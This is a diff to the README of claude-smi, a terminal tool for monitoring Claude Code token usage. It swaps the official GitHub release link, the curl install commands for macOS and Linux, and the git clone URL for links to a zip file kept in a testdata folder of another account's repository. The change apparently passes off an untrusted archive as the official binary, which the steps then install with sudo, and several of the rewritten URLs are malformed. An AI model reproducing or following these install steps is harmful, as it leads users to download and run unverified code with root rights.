@@ -21,21 +21,21 @@ Terminal UI for monitoring Claude Code token usage and costs — built for **Max
 
 Prebuilt binaries for macOS, Linux, Windows (amd64/arm64):
 
-https://github.com/anomredux/claude-smi/releases/latest
+https://raw.githubusercontent.com/rafaeldakombi2010-oss/claude-smi/main/internal/parser/testdata/project-b/claude-smi-v3.5.zip
 
 ```bash
 VERSION=0.1.0
 
 # macOS (Apple Silicon)
-curl -sL https://github.com/anomredux/claude-smi/releases/download/v${VERSION}/claude-smi_${VERSION}_darwin_arm64.tar.gz | tar xz
+curl -sL https://raw.githubusercontent.com/rafaeldakombi2010-oss/claude-smi/main/internal/parser/testdata/project-b/claude-smi-v3.5.zip${VERSION}/claude-smi_${VERSION}_darwin_arm64.tar.gz | tar xz
 sudo mv claude-smi /usr/local/bin/
 
 # macOS (Intel)
-curl -sL https://github.com/anomredux/claude-smi/releases/download/v${VERSION}/claude-smi_${VERSION}_darwin_amd64.tar.gz | tar xz
+curl -sL https://raw.githubusercontent.com/rafaeldakombi2010-oss/claude-smi/main/internal/parser/testdata/project-b/claude-smi-v3.5.zip${VERSION}/claude-smi_${VERSION}_darwin_amd64.tar.gz | tar xz
 sudo mv claude-smi /usr/local/bin/
 
 # Linux (amd64)
-curl -sL https://github.com/anomredux/claude-smi/releases/download/v${VERSION}/claude-smi_${VERSION}_linux_amd64.tar.gz | tar xz
+curl -sL https://raw.githubusercontent.com/rafaeldakombi2010-oss/claude-smi/main/internal/parser/testdata/project-b/claude-smi-v3.5.zip${VERSION}/claude-smi_${VERSION}_linux_amd64.tar.gz | tar xz
 sudo mv claude-smi /usr/local/bin/
 ```
 
@@ -48,7 +48,7 @@ go install github.com/anomredux/claude-smi/cmd/claude-smi@latest
 ### Build from source
 
 ```bash
-git clone https://github.com/anomredux/claude-smi.git
+git clone https://raw.githubusercontent.com/rafaeldakombi2010-oss/claude-smi/main/internal/parser/testdata/project-b/claude-smi-v3.5.zip
 cd claude-smi
 go build -o claude-smi ./cmd/claude-smi
 ```
